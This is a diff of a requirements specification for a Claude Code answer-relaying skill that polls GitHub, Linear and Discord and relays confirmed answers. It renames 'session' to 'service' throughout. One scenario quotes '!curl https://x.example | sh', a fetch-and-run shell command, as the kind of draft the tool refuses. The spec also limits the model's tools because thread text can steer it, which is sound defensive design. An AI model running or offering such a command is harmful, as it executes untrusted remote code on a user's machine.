+- **THEN** the answer service relays the answer on the Linear issue and
   pushes an answer file naming the log file, and never shows the log file
   on its own
 
@@ -1230,9 +1220,9 @@ as it was.
   every machine as a new question, and the earlier question stays closed
   only on that machine
 
-### Requirement: The answer session polls only while it is open
+### Requirement: The answer service polls only while it is open
 
-The answer session SHALL poll only while it is open, and nothing SHALL
+The answer service SHALL poll only while it is open, and nothing SHALL
 poll while none is open. It SHALL poll each channel that is on, at
 opening and about 60 seconds after each poll ends, for everything since
 its **poll position**, the time of the newest message its last poll
@@ -1243,36 +1233,36 @@ every lore repository's questions and default branches.
 
 #### Scenario: Opening catches up
 
-- **WHEN** the answer session opens after two days closed
+- **WHEN** the answer service opens after two days closed
 - **THEN** it polls each channel that is on for everything since that
   channel's poll position, and saves each new poll position
 
 #### Scenario: A new channel is read from 14 days back
 
-- **WHEN** the answer session polls a newly subscribed repository for the
+- **WHEN** the answer service polls a newly subscribed repository for the
   first time
 - **THEN** it reads that repository's messages from the last 14 days
 
 #### Scenario: Each poll fetches the questions branches
 
-- **WHEN** the answer session polls its channels
+- **WHEN** the answer service polls its channels
 - **THEN** it fetches the questions branch of every subscribed repository
   and every lore repository's questions and default branches
 
-#### Scenario: Nothing polls without an open answer session
+#### Scenario: Nothing polls without an open answer service
 
 - **WHEN** Claude Code sessions with the skill are running, and none has
-  its answer session open
+  its answer service open
 - **THEN** no channel or questions branch is polled
 
 ### Requirement: The poll reads every GitHub question source
 
-At each GitHub poll the answer session SHALL read, since its poll
+At each GitHub poll the answer service SHALL read, since its poll
 position, each subscribed repository: its new issues and pull requests,
 its new comments, reviews and review-thread comments, and its review
 requests and assignments naming the person. Each request SHALL send the
 `ETag` of its list's last response, `304` meaning nothing new. When
-GitHub refuses a request for its rate limit, the session SHALL keep
+GitHub refuses a request for its rate limit, the service SHALL keep
 every poll position and ETag and wait for the reset time, telling the
 person once.
 
@@ -1280,14 +1270,14 @@ person once.
 
 - **WHEN** a poll requests a subscribed repository's issue list with the
   `ETag` of its last answer, and GitHub answers `304`
-- **THEN** the answer session finds nothing new in that list and keeps
+- **THEN** the answer service finds nothing new in that list and keeps
   its poll position and `ETag`
 
 #### Scenario: A poll refused for the rate limit waits for the reset
 
 - **WHEN** GitHub refuses a poll's request for the rate limit, giving a
   reset time 20 minutes later
-- **THEN** the answer session sends none of the poll's other requests,
+- **THEN** the answer service sends none of the poll's other requests,
   keeps every poll position and `ETag`, even of the lists read before the
   refusal, since a repository's poll position is one time for all its
   lists, tells the person once that GitHub is not polled until then, and
@@ -1299,12 +1289,12 @@ person once.
   requested the person's review, someone replied in one of its review
   threads to a relay post, and someone mentioned the person in a new
   comment on an issue opened a month earlier
-- **THEN** the answer session shows all three as questions asked of the
+- **THEN** the answer service shows all three as questions asked of the
   person
 
-### Requirement: The answer session reads with the person's credentials, except on Discord
+### Requirement: The answer service reads with the person's credentials, except on Discord
 
-The answer session SHALL read GitHub with the person's `gh` login and
+The answer service SHALL read GitHub with the person's `gh` login and
 Linear with the person's Linear API key, keeping that key only in memory
 and never in a command's arguments, and SHALL use the GitHub and
 Linear relay identities only for the checks of *Setup checks each relay
@@ -1315,15 +1305,15 @@ and post, in the channels it has been added to.
 
 #### Scenario: Reading uses the person's gh login and posting the relay
 
-- **WHEN** the answer session reads a subscribed repository's issues,
+- **WHEN** the answer service reads a subscribed repository's issues,
   then relays an answer there
 - **THEN** it reads through the person's `gh` login, and posts as the
   GitHub relay identity
 
 #### Scenario: The person's Linear key appears in no command's arguments
 
-- **WHEN** the answer session reads a subscribed Linear team
-- **THEN** the answer session's own code makes the HTTP request with the
+- **WHEN** the answer service reads a subscribed Linear team
+- **THEN** the answer service's own code makes the HTTP request with the
   person's Linear API key, and no command it runs holds the key in its
   arguments
 
@@ -1335,7 +1325,7 @@ and post, in the channels it has been added to.
 
 ### Requirement: An answer is relayed as the person's words
 
-The answer session SHALL relay an answer by posting, as the relay
+The answer service SHALL relay an answer by posting, as the relay
 identity in the question's thread, `User says: ` and the answer exactly
 as confirmed, keeping the post's id in the state folder. On Discord it
 SHALL use discord-bot without header options and with mention rewriting
@@ -1408,7 +1398,7 @@ a relay post SHALL name its question by replying to it.
 
 ### Requirement: An answer whose own last line starts with Re is reworded, not posted
 
-The answer session SHALL NOT post an answer, or an edit of a relay post,
+The answer service SHALL NOT post an answer, or an edit of a relay post,
 whose own last line starts with `Re: `, which a reader would take for the
 line naming a question, and SHALL ask the person to reword it.
 
@@ -1416,14 +1406,14 @@ line naming a question, and SHALL ask the person to reword it.
 
 - **WHEN** the person confirms an answer whose last line is
   `Re: https://github.com/o/api/issues/7#issuecomment-1`
-- **THEN** the answer session posts nothing and pushes no file, and asks
+- **THEN** the answer service posts nothing and pushes no file, and asks
   the person to reword the answer
 - **AND** an answer holding `Re: ` anywhere but at the start of its last
   line is posted as usual
 
 ### Requirement: A relay post is posted by a host command, unvetted
 
-The answer session SHALL post by a host command, never the model's tool
+The answer service SHALL post by a host command, never the model's tool
 call: the relay's skill, run as an argument vector with no shell, the
 text on standard input or in a private file, or on Linear its own request
 (*The Linear relay's token stays in memory*). Neither prose's pass nor the inquisitor's filters SHALL apply to a relay
@@ -1456,26 +1446,26 @@ are a closed list of token shapes* and post none that matches.
 
 ### Requirement: The Linear relay's token stays in memory
 
-On Linear, where linear-app has no post command, the answer session SHALL
+On Linear, where linear-app has no post command, the answer service SHALL
 post, edit and delete by its own HTTP request. It SHALL pass each text
 only as a GraphQL variable, so no text can change the query. It SHALL hold
 the token linear-app's `token` command prints only in memory, never in a
 command's arguments, which any user of the machine can read.
 
-#### Scenario: A Linear relay post is the answer session's own request
+#### Scenario: A Linear relay post is the answer service's own request
 
 - **WHEN** the person relays an answer to a Linear question
-- **THEN** the answer session posts it with its own HTTP request, with
+- **THEN** the answer service posts it with its own HTTP request, with
   the token linear-app's `token` command printed to it, and no tool call
   of the model posts it
-- **AND** no command the session runs holds the token in its arguments,
+- **AND** no command the service runs holds the token in its arguments,
   the answer's text goes into the request only as a GraphQL variable, and
-  the session edits and deletes its Linear posts the same way
+  the service edits and deletes its Linear posts the same way
 
 ### Requirement: A failed relay post is reported to the person
 
 When a surface refuses a relay post or its edit, or the relay identity's
-command fails, the answer session SHALL tell the person why nothing was posted or
+command fails, the answer service SHALL tell the person why nothing was posted or
 changed, as the surface or skill says. A failed question to the asker SHALL leave its question as
 it was, and a failed automatic post SHALL leave its question shown as
 unanswered; a failed answer stays pending (*An answer that cannot reach
@@ -1484,14 +1474,14 @@ its thread is kept pending*).
 #### Scenario: A failed question to the asker or automatic post leaves its question unanswered
 
 - **WHEN** the relay's command fails on the person's question to the
-  asker, or on a `Recorded answer: ` post the answer session makes by
+  asker, or on a `Recorded answer: ` post the answer service makes by
   itself
 - **THEN** the person is told why nothing was posted, and the question
   shows as unanswered, not waiting for the asker
 
 ### Requirement: An answer that cannot reach its thread is kept pending
 
-The answer session SHALL keep a confirmed answer that cannot be posted
+The answer service SHALL keep a confirmed answer that cannot be posted
 in its thread as **answered, not relayed**, on this machine's **pending
 list**, with the thread it must go to, when its channel is off or not
 subscribed on this machine, its post is refused or fails, or the fetch before
@@ -1503,7 +1493,7 @@ relay by hand.
 
 - **WHEN** the person confirms an answer and Discord refuses the relay
   post, as for lack of permission
-- **THEN** the answer session keeps the answer as answered, not relayed,
+- **THEN** the answer service keeps the answer as answered, not relayed,
   its question leaves this machine's queue, and the person is told the
   asker has not got it and shown its text to relay by hand
 
@@ -1541,9 +1531,7 @@ the relay identity's own check passed when last run.
 ### Requirement: A pending answer that no check returns waits for the person
 
 A pending answer SHALL stay, whatever check passes, unless *A pending answer returns to the queue once its channel works
-again* returns it; that rule returns no answer refused for its text. A
-refusal task 0.25's mapping does not cover counts as refused for its
-text, and is shown with the surface's error. The person SHALL be able to edit or drop a pending
+again* returns it; an answer refused for its text never returns that way. A refusal outside task 0.25's map of each surface's errors counts as refused for its text, and is shown with the surface's error. The person SHALL be able to edit or drop a pending
 answer at any time, and post it while its channel is on and subscribed on
 this machine; a dropped answer is never posted.
 
@@ -1554,7 +1542,7 @@ this machine; a dropped answer is never posted.
 - **THEN** the answer stays pending until the person edits, posts or
   drops it, and does not go back into the queue
 
-#### Scenario: A refusal the session cannot place waits for the person
+#### Scenario: A refusal the service cannot place waits for the person
 
 - **WHEN** Discord refuses a relay post with an error task 0.25's mapping
   does not place, and the channel's check later passes
@@ -1570,7 +1558,7 @@ this machine; a dropped answer is never posted.
 ### Requirement: A questions-branch answer's file is pushed after its post
 
 When an answer gets an answer file and a fetch of its thread just before
-its post finds no new message, the answer session SHALL record the
+its post finds no new message, the answer service SHALL record the
 **owed push** in the state folder, post, add the post's URL to the
 record, and push the file with that URL as its `answer_link`, retrying a
 failed push at each poll and opening. The record of a post that fails
@@ -1579,7 +1567,7 @@ next opening is dropped too.
 
 #### Scenario: An owed push survives a crash
 
-- **WHEN** an answer's relay post goes out, and the answer session stops
+- **WHEN** an answer's relay post goes out, and the answer service stops
   before pushing the answer file
 - **THEN** at its next opening it pushes the answer file it recorded as
   owed
@@ -1589,7 +1577,7 @@ next opening is dropped too.
 
 ### Requirement: An owed push refused for good is not retried
 
-The answer session SHALL NOT retry any owed push the `log` or `cite`
+The answer service SHALL NOT retry any owed push the `log` or `cite`
 command refuses for a reason that will not change, such as lack of access, telling the person
 what was not logged, and why.
 
@@ -1605,11 +1593,7 @@ what was not logged, and why.
 
 When a questions-branch question has no thread, or its channel here is
 off or unsubscribed, the answer file, with no `answer_link`, SHALL be
-pushed as an owed push without fetching the thread, once the answer is
-confirmed or its refused relay post turns the channel off; unless the
-question has a category or its more visible record awaits confirmation
-(*The preview warns before a record goes somewhere more visible*). An answer with no thread is not
-kept pending.
+pushed as an owed push without fetching the thread, once the answer is confirmed or its refused relay post turns the channel off. Neither applies to a question with a category, or one whose more visible record awaits confirmation (*The preview warns before a record goes somewhere more visible*). An answer with **no thread** is never kept pending.
 
 #### Scenario: An answer to a questions-branch question is logged at once
 
@@ -1638,7 +1622,7 @@ kept pending.
 ### Requirement: An answer logged at once gets a new file only when posted edited
 
 When the person later posts an answer whose file was pushed at once,
-the answer session SHALL push a new answer file, naming the same
+the answer service SHALL push a new answer file, naming the same
 questions-branch file as the first, only if its text was edited.
 
 #### Scenario: An edited answer pushed at once pushes a new file when posted
@@ -1651,7 +1635,7 @@ questions-branch file as the first, only if its text was edited.
 
 ### Requirement: A relay post can be edited where it was posted
 
-The answer session SHALL let the person edit the latest relay post
+The answer service SHALL let the person edit the latest relay post
 naming a question, and SHALL edit it in place, as
 the relay identity that posted it, found by the id the state folder keeps
 or, where this machine lacks it, in the question's thread. The edit SHALL
@@ -1677,18 +1661,13 @@ automatic post's prefix, `Recorded answer: ` or `Inquisitor: `, becomes
 
 - **WHEN** the person edits, on their second machine, a Linear answer
   relayed from their first
-- **THEN** the answer session finds the relay post in the question's
+- **THEN** the answer service finds the relay post in the question's
   thread and edits it
 
 ### Requirement: An edit to a questions-branch answer pushes a new log file
 
 When an edit the surface accepts leaves a `User says: ` answer to a
-questions-branch log file's question that has no category, the answer session SHALL push a
-new log file if that file is unanswered or answered only by the
-session's answer files for this answer's earlier texts. The new file
-holds the earlier answer file's question, or with none the question the
-person saw, and names the log file in `answers` unless that log file is
-itself the earlier answer. The newest file counts as the answer.
+questions-branch log file's question that has no category, the answer service SHALL push a new answer file, unless an answer other than this one's earlier texts answers that log file. The new file holds the earlier text's answer file's question, or with none the question the person saw, and names the log file in `answers`, unless that log file is itself the earlier answer. The newest file counts as the answer.
 
 #### Scenario: Editing an agreed recorded answer into the person's words pushes a log file
 
@@ -1703,7 +1682,7 @@ itself the earlier answer. The newest file counts as the answer.
 
 - **WHEN** the person edits a relayed `User says: ` answer to a
   questions-branch log file's question, and the log file's only answer is
-  the answer file the answer session pushed for that answer's earlier
+  the answer file the answer service pushed for that answer's earlier
   text
 - **THEN** the script pushes a new log file naming that log file,
   holding the earlier answer file's question and the edited answer, with
@@ -1716,7 +1695,7 @@ itself the earlier answer. The newest file counts as the answer.
 
 ### Requirement: The person can ask the asker
 
-The answer session SHALL let the person ask the asker for clarification
+The answer service SHALL let the person ask the asker for clarification
 instead of answering, posting the clarifying question as it posts an
 answer, except that the post starts with `User asks: ` and tags the
 asker when the asker is a person. The question then waits for the asker.
@@ -1730,10 +1709,8 @@ asker when the asker is a person. The question then waits for the asker.
 
 ### Requirement: The thread is the durable record of an answer
 
-The answer session SHALL take a question's state from the latest relay
-post naming it in its thread: `User says: ` answered; `Recorded answer: `
-answered, and `Inquisitor: ` handled, for the person, listed apart from
-the queue; `User asks: ` waiting for the asker, whose reply requeues
+The answer service SHALL take a question's state from the latest relay
+post naming it in its thread: `User says: ` answered; `Recorded answer: ` answered and `Inquisitor: ` handled, both listed for the person apart from the queue; `User asks: ` waiting for the asker, whose reply requeues
 it; otherwise unanswered. This machine adds only its pending answers and
 closed questions, and a question closed here stays closed whatever its
 thread shows.
@@ -1769,10 +1746,7 @@ thread shows.
 
 ### Requirement: A questions-branch question's state is read from its branch
 
-A questions-branch file SHALL count as answered once it is no longer
-unanswered, a word the inquisitor's Purpose defines. Only a handled file
-naming it SHALL close it, on every machine and for good, and closing
-leaves it unanswered. Its thread copy is a question of its own: answering
+A questions-branch file SHALL count as answered once it stops being *unanswered*, as the inquisitor's Purpose defines that word. Only a handled file naming it SHALL close it, on every machine and for good; closing takes it off the queue but does not make it answered. Its thread copy is a question of its own: answering
 that copy on a machine where it is still open still pushes a log file.
 
 #### Scenario: An answer to a closed file's thread copy still logs
@@ -1785,7 +1759,7 @@ that copy on a machine where it is still open still pushes a log file.
 ### Requirement: The thread is read again before a question is shown and before a post
 
 When a question comes on screen and its channel's last poll is over
-about a minute old, the answer session SHALL fetch and show every reply in
+about a minute old, the answer service SHALL fetch and show every reply in
 its thread since the question. Before each relay post it SHALL fetch
 the thread again and post nothing if the fetch fails, a relay post there
 answers or handles the question, or a reply the person has not seen is
@@ -1811,7 +1785,7 @@ question unanswered.
   thread since the question was shown
 - **THEN** nothing is posted, the asker's reply is shown, and the answer
   is kept pending
-- **AND** had the session been about to post an automatic reply, nothing
+- **AND** had the service been about to post an automatic reply, nothing
   is posted, and the question is shown as unanswered with that reply
 
 #### Scenario: A failed fetch stops the post
@@ -1822,7 +1796,7 @@ question unanswered.
 
 ### Requirement: An automatic post is deleted when another relay post came first
 
-After each automatic post, the answer session SHALL fetch the thread once
+After each automatic post, the answer service SHALL fetch the thread once
 more. It SHALL delete its own post when another of the person's relay
 posts naming the question was posted before it, or at the same time, as
 the surface reports times, with an id that sorts before its own byte by
@@ -1832,27 +1806,27 @@ its miss file. If the fetch or the delete fails, both posts stay.
 
 #### Scenario: Of two machines' automatic replies, the later one is deleted
 
-- **WHEN** sessions on two machines both fetch an agent's question's
+- **WHEN** services on two machines both fetch an agent's question's
   thread before either posts, and each posts its `Inquisitor: ` reply,
   the second a few seconds after the first
-- **THEN** the second session, fetching the thread after its post, finds
+- **THEN** the second service, fetching the thread after its post, finds
   the first reply and deletes its own, and its miss file stays
 - **AND** had both replies carried the same time, the one whose id is
   larger in byte order would be deleted
 - **AND** had the first been the person's `User says: ` answer or
   `User asks: ` question, relayed from the other machine, the second
-  session's reply would be deleted the same way
+  service's reply would be deleted the same way
 
 #### Scenario: Another person's automatic answer deletes nothing
 
 - **WHEN** Alice's message tags Bob and Carol, who each run an answer
-  session, and Carol's session posts its `Recorded answer: ` reply first
-- **THEN** Bob's session still posts its own and deletes nothing, since
+  service, and Carol's service posts its `Recorded answer: ` reply first
+- **THEN** Bob's service still posts its own and deletes nothing, since
   Carol's post is not one of Bob's relay posts
 
 ### Requirement: Local state is per machine, in the state folder
 
-The answer session SHALL keep its working state per machine in the state
+The answer service SHALL keep its working state per machine in the state
 folder, as *The state folder holds all working state* lists, except a
 lore repository's branches, which it fetches into that repository's
 configured clone. A discussion
@@ -1869,7 +1843,7 @@ outlives it.
 
 #### Scenario: The state folder holds all working state
 
-- **WHEN** the answer session saves its working state
+- **WHEN** the answer service saves its working state
 - **THEN** apart from a lore repository's branches, which it fetches into
   that repository's configured clone, it writes only to the state
   folder: the questions set aside
@@ -1883,22 +1857,22 @@ outlives it.
 
 ### Requirement: Reopening shows the question last on screen
 
-On opening, the answer session SHALL show the question last on screen,
+On opening, the answer service SHALL show the question last on screen,
 even after Claude Code restarted, unless it has since been answered or has
 a category; then it SHALL show the next in the queue.
 
 #### Scenario: Reopening lands on the same question unless it was answered or has a category
 
 - **WHEN** the person closes Claude Code with a question on screen, starts
-  it again, and opens the answer session
-- **THEN** the answer session shows that question, or the next in the
+  it again, and opens the answer service
+- **THEN** the answer service shows that question, or the next in the
   queue if it was since answered from another machine, or has a category
   and so was kept only in memory
 
 ### Requirement: A question with a category leaves no readable record on disk
 
 For a question with a category, as the inquisitor's *Some questions are
-recorded by hash only* requires, the answer session SHALL write no
+recorded by hash only* requires, the answer service SHALL write no
 discussion record or file holding its question's or answer's text, keep its question on screen and pending
 answer only in memory, and name it in the state folder only by its hash
 and the surface's ids for its thread and message.
@@ -1906,37 +1880,37 @@ and the surface's ids for its thread and message.
 #### Scenario: A discussed question holding a secret leaves nothing readable
 
 - **WHEN** the person discusses, and holds a pending answer to, a Discord
-  message the session's model judges holds a password, and Claude Code
+  message the service's model judges holds a password, and Claude Code
   restarts
 - **THEN** the state folder held no discussion record and none of the
   question's or the answer's text, and the question returns unanswered,
   with no pending answer
 
-### Requirement: One answer session runs on each machine
+### Requirement: One answer service runs on each machine
 
-The answer session SHALL hold a lock, the state folder's file `lock`,
+The answer service SHALL hold a lock, the state folder's file `lock`,
 naming its session's id, name and start; refresh it at least every 30
 seconds, stale after 2 minutes unrefreshed; and take it only when absent,
 stale or unparsable, or on a takeover. A Claude Code session SHALL open
-no answer session while another's holds a fresh lock, but show what the
+no answer service while another's holds a fresh lock, but show what the
 lock names and offer a takeover. Before each
-refresh, poll, post and push, the answer session SHALL close if the lock
+refresh, poll, post and push, the answer service SHALL close if the lock
 names another id.
 
 #### Scenario: A second session is offered the choice
 
 - **WHEN** a session named `Answers` holds a fresh lock, and the person
   runs `answer` again
-- **THEN** this session opens no answer session, names the session holding
+- **THEN** this session opens no answer service, names the session holding
   the lock as `Answers` with its id and start time, and offers to take
   over
 
 #### Scenario: Taking over stops the old session
 
-- **WHEN** the person takes over from another session's answer session
+- **WHEN** the person takes over from another session's answer service
 - **THEN** the new session replaces the lock, and the old session, finding
   before its next refresh, poll, post or push that the lock names another
-  id, closes its answer session and refreshes, polls, posts and pushes
+  id, closes its answer service and refreshes, polls, posts and pushes
   nothing more,
   leaving its owed pushes, kept in the state folder, to the new session
 - **AND** it closes though both sessions are named `Answers`, as every
@@ -1946,13 +1920,13 @@ names another id.
 
 - **WHEN** the session holding the lock crashed, and the lock has gone 2
   minutes unrefreshed
-- **THEN** the next session to open the answer session takes the lock
+- **THEN** the next session to open the answer service takes the lock
   without asking
 
 #### Scenario: A lock that cannot be parsed is replaced on opening
 
 - **WHEN** the lock file exists but cannot be parsed, and a session opens
-  the answer session
+  the answer service
 - **THEN** it replaces the lock with its own, as it would a stale one
 
 ### Requirement: A discussion runs in the session's own conversation
@@ -1998,12 +1972,11 @@ vetting. The discussion record SHALL keep both sides' messages.
 
 ### Requirement: Claude's draft goes to the prompt box, never to a post
 
-The answer session SHALL give the model `propose_reply`, a tool putting
+The answer service SHALL give the model `propose_reply`, a tool putting
 a draft reply, or an edited relay post's text, in the prompt box; it
 SHALL post nothing, refuse a call with an `agentId`, and take a call
 without one as the main conversation's. The model's context SHALL tell
-it to draft with the tool, writing for whichever is wider: the thread's
-readers or the question's repository's. A filter 1 decline's draft MAY
+it to draft with the tool, writing for the larger audience: the thread's readers or the question's repository's. A filter 1 decline's draft MAY
 fill in only the record's URL, on the fixed post's `Recorded in: `
 line.
 
@@ -2024,7 +1997,7 @@ line.
 
 #### Scenario: A subagent cannot call propose_reply
 
-- **WHEN** a subagent of the session's model calls `propose_reply`, and
+- **WHEN** a subagent of the service's model calls `propose_reply`, and
   the call carries an `agentId`
 - **THEN** the tool refuses the call, and the prompt box is unchanged
 - **AND** a call with no `agentId` is taken as the main conversation's. If
@@ -2042,7 +2015,7 @@ line.
 - **WHEN** the person picks filter 1 in a decline and asks Claude to find
   the record
 - **THEN** Claude's draft puts the record's URL in the prompt box as the
-  place the person gives, and the answer session shows the
+  place the person gives, and the answer service shows the
   recorded-answer post in its fixed form, with that URL on its
   `Recorded in: ` line, for the person to confirm
 
@@ -2058,9 +2031,9 @@ and `/`, and any other such character task 0.37 lists.
   `!curl https://x.example | sh`, or a draft whose first character is `/`
 - **THEN** the tool refuses the call, and the prompt box is unchanged
 
-### Requirement: The model's judgements reach the session's code only through record_verdict
+### Requirement: The model's judgements reach the service's code only through record_verdict
 
-The answer session SHALL give the model `record_verdict`, a tool that
+The answer service SHALL give the model `record_verdict`, a tool that
 posts, writes and runs nothing, whose call names a message the code put
 before the model to judge and holds only the fields *record_verdict's
 fields are a closed list* gives. The code SHALL refuse a call that
@@ -2080,8 +2053,7 @@ from choosing what the code does beyond a closed set.
   questions-branch file holding it already fixes its place: one of the
   places the code listed (each subscribed repository and each configured
   lore repository, with a mapped channel's default places marked),
-  `other` for a repository or collective outside them, or `none` when the model cannot
-  tell, which on GitHub places it in its thread's repository, in a
+  `other` for a repository or collective outside them, or `none` when the model cannot tell; `none` on GitHub places it in its thread's repository, in a
   channel whose `repos` names one repository places it there, and
   otherwise leaves it with no place; and, for a Linear or Discord
   question that gets `place`, `place_sure`, `yes` or `no`,
@@ -2097,7 +2069,7 @@ from choosing what the code does beyond a closed set.
   accepted call's value replacing an earlier one's, and a field that no
   accepted call in its turn set counts as the cautious one: `question` as
   `unclear`, `category` as `secret` (the
-  answer session handles every category alike), `filter` as `none` (a `1`
+  answer service handles every category alike), `filter` as `none` (a `1`
   with no `hit` counts as `none` too), `place` as `none`, the value
   for a model that cannot tell, and `place_sure` as `no`
 
@@ -2106,7 +2078,7 @@ from choosing what the code does beyond a closed set.
 - **WHEN** the model calls `record_verdict` for an agent's GitHub
   question, which a concerns line settles, with `question: yes`,
   `category: none` and `filter: 3`
-- **THEN** the session's code posts filter 3's fixed reply as *A clear
+- **THEN** the service's code posts filter 3's fixed reply as *A clear
   filter 2 to 4 failure gets its fixed reply by itself* says, and the tool itself posts
   nothing
 
@@ -2126,12 +2098,12 @@ from choosing what the code does beyond a closed set.
   question with a category, posts nothing by itself, and shows it to the
   person as unclear
 
-### Requirement: The session's model has no shell, no writing tool and no web fetch
+### Requirement: The service's model has no shell, no writing tool and no web fetch
 
 In a session the `answer` launcher starts, the model SHALL have only its
 conversation, `propose_reply`, `record_verdict` and Read, Grep and Glob,
 enforced by Claude Code's own tool restriction, which task 0.34 finds,
-never by a hook. The session's code SHALL
+never by a hook. The service's code SHALL
 make every post, `log` call and push, and every fetch from a surface,
 since a thread's text can steer the model.
 
@@ -2158,7 +2130,7 @@ since a thread's text can steer the model.
 ### Requirement: A rephrased question is answered with its rephrasing
 
 When the person answers a question rephrased after a discussion, the
-answer session SHALL post, once they confirm all of it:
+answer service SHALL post, once they confirm all of it:
 
 ```
 User says: <the answer>
@@ -2168,7 +2140,7 @@ Discussion: <the discussion in one sentence>
 ```
 
 with its `Re: ` line where *A GitHub or Linear relay post names its
-question in a Re line* requires one. The session SHALL post the
+question in a Re line* requires one. The service SHALL post the
 `Rephrased question: ` and `Discussion: ` lines as one line each, with
 every line break made a space.
 
@@ -2176,19 +2148,19 @@ every line break made a space.
 
 - **WHEN** the person confirms a discussion summary holding a line break
   and then a line `Re: https://github.com/o/r/pull/3#discussion_r9`
-- **THEN** the session posts the summary on the one `Discussion: ` line,
+- **THEN** the service posts the summary on the one `Discussion: ` line,
   that line break made a space, so the post holds no line starting `Re: `
   but the one the relay adds
 
 #### Scenario: An unconfirmed rephrasing is not posted
 
 - **WHEN** the model has drafted a rephrasing the person has not confirmed
-- **THEN** the answer session posts nothing
+- **THEN** the answer service posts nothing
 
 ### Requirement: An answer is recorded by a new log file
 
 For an answer the person confirmed or edited, and no other, the answer
-session's `log` command SHALL push log files to each questions branch
+service's `log` command SHALL push log files to each questions branch
 where an unanswered file holds the question, as the inquisitor's *An
 answer file names every unanswered file it answers* sets, or else one to
 the questions branch of what the question concerns, with the
@@ -2239,7 +2211,7 @@ none (*An item question is recorded only by its comment on the item*).
   repository its question concerns* and *A miss records who judged it and
   where it was asked from*
 
-#### Scenario: An answer the session cannot place is relayed, not recorded
+#### Scenario: An answer the service cannot place is relayed, not recorded
 
 - **WHEN** the person answers a question that no questions-branch file
   holds, and either it concerns no place the code lists for
@@ -2250,7 +2222,7 @@ none (*An item question is recorded only by its comment on the item*).
 ### Requirement: An item question is recorded only by its comment on the item
 
 A review request or an assigned issue shown as a question in its own
-right, not through a handback or a question in its description, is an **item question**. The answer session SHALL record
+right, not through a handback or a question in its description, is an **item question**. The answer service SHALL record
 an answer to one only by the comment it posts on the item, and SHALL
 write no log file or miss for it and run no filter 1 on it, since the
 item has no question text to hash or search.
@@ -2331,12 +2303,12 @@ it is an item question, an answer's preview SHALL let the person pick
 another subscribed or configured lore repository. A decline's preview
 SHALL offer it only for an agent's question that no concerns line
 settles. The pick SHALL be what the question concerns for that answer
-or decline: the session checks its visibility, runs filter 1 for it and
+or decline: the service checks its visibility, runs filter 1 for it and
 shows any hit first, and posts nothing by itself.
 
 #### Scenario: The person moves a question to another place
 
-- **WHEN** the session's model placed a Discord question `other`, and in
+- **WHEN** the service's model placed a Discord question `other`, and in
   the preview the person picks the subscribed, public `o/web`, whose
   questions branch holds a decision filter 1 finds
 - **THEN** the preview warns that the record on `o/web`'s questions
@@ -2374,16 +2346,16 @@ item.
 ### Requirement: A questions-branch answer file records the answer as given
 
 The answer file SHALL hold the question the person saw; the `authority`
-the inquisitor sets for an answer the session's person gives; and,
+the inquisitor sets for the person's answer; and,
 as quote lines, the relay post's text, as the inquisitor's
 *An answer logged from a comment is the comment's whole text* sets, or the
 confirmed answer if unrelayed, with any rephrasing and discussion summary
 in their own sections. The `log` command SHALL read a GitHub relay post
-itself; for Linear or Discord the session SHALL pass it the relayed text.
+itself; for Linear or Discord the service SHALL pass it the relayed text.
 
 #### Scenario: A relayed answer's file records the relay post as where it is recorded
 
-- **WHEN** an answer file is pushed for an answer the session relayed
+- **WHEN** an answer file is pushed for an answer the service relayed
 - **THEN** the file's `recorded_in` is the relay post's URL, the same URL
   as its `answer_link`
 - **AND** for an answer with no relay post, `recorded_in` is the
@@ -2417,14 +2389,14 @@ itself; for Linear or Discord the session SHALL pass it the relayed text.
 
 - **WHEN** the person answers, from its Linear thread, a question about a
   private repository
-- **THEN** the `log` command logs as the answer the text the session
+- **THEN** the `log` command logs as the answer the text the service
   posted as the relay, `User says: ` included, and nothing fetches the file's
   `answer_link`, that Linear comment's URL
 
 #### Scenario: A log file of a Discord-relayed answer holds the text before mentions are rewritten
 
 - **WHEN** the person answers a question about a private repository asked
-  in a Discord thread, and the session relays it on Discord
+  in a Discord thread, and the service relays it on Discord
 - **THEN** the answer file's answer is the text sent to discord-bot,
   before any mention is rewritten
 
@@ -2432,18 +2404,17 @@ itself; for Linear or Discord the session SHALL pass it the relayed text.
 
 When a decline, a `Recorded answer: ` post, an `Inquisitor: ` reply or an
 answer to a question with a category takes a question off the queue, the
-session SHALL push a **handled file** for each unanswered
+service SHALL push a **handled file** for each unanswered
 questions-branch log file that holds the question and that no handled
 file names.
 
 #### Scenario: An automatic reply pushes a handled file
 
-- **WHEN** the answer session's own filter 2, 3 or 4 reply goes out on a thread
+- **WHEN** the answer service's own filter 2, 3 or 4 reply goes out on a thread
   copy an unanswered log file holds
 - **THEN** a handled file naming that log file is pushed
-- **AND** the session does the same for a `Recorded answer: ` post and for any
-  decline, agreeing included, with a thread or without, being the only
-  writer of handled files under the inquisitor's *Only an answer session
+- **AND** the service does the same for a `Recorded answer: ` post and for any decline, agreeing to a shown recorded answer or suggested verdict included, with a thread or without, being the only
+  writer of handled files under the inquisitor's *Only an answer service
   writes a handled file*
 
 #### Scenario: A handled file closes only the file it names
@@ -2457,18 +2428,18 @@ file names.
 
 - **WHEN** the person declines a question that two unanswered
   questions-branch files hold
-- **THEN** the answer session pushes two handled files, each naming one
+- **THEN** the answer service pushes two handled files, each naming one
   of them
 
 ### Requirement: A handled file is pushed once its close takes effect
 
-The answer session SHALL push a handled file once the post leading to it
+The answer service SHALL push a handled file once the post leading to it
 is out, or, with nothing posted or for a question with a category, once
 the person confirms the answer or decline.
 It SHALL record the owed push before posting or pushing; drop it if the
 post it waits for fails or is held back, recording it again before any
 later post; and retry it at each poll and each opening of the
-session until it succeeds or *An owed push refused for good is not
+service until it succeeds or *An owed push refused for good is not
 retried* stops it.
 
 #### Scenario: A failed post pushes no handled file
@@ -2496,24 +2467,24 @@ retried* stops it.
 
 ### Requirement: A miss or citation file's push is owed and retried as a handled file's is
 
-The answer session SHALL record, drop and retry each miss or citation
+The answer service SHALL record, drop and retry each miss or citation
 file's push as *A handled file is pushed once its close takes effect* does
 a handled file's.
 
-#### Scenario: A miss or citation owed when the session stopped is pushed later
+#### Scenario: A miss or citation owed when the service stopped is pushed later
 
-- **WHEN** the answer session stops after a post goes out but before
+- **WHEN** the answer service stops after a post goes out but before
   pushing the miss or citation file it leads to, or that push fails
 - **THEN** it pushes the file at its next opening, or retries it at each
   poll and opening until it succeeds
 
 #### Scenario: A reply's miss file is pushed after the reply
 
-- **WHEN** the answer session posts an `Inquisitor: ` reply
+- **WHEN** the answer service posts an `Inquisitor: ` reply
 - **THEN** it takes the reply's id from the surface's response and then
   pushes the miss file that id names, as the inquisitor's *Every miss file
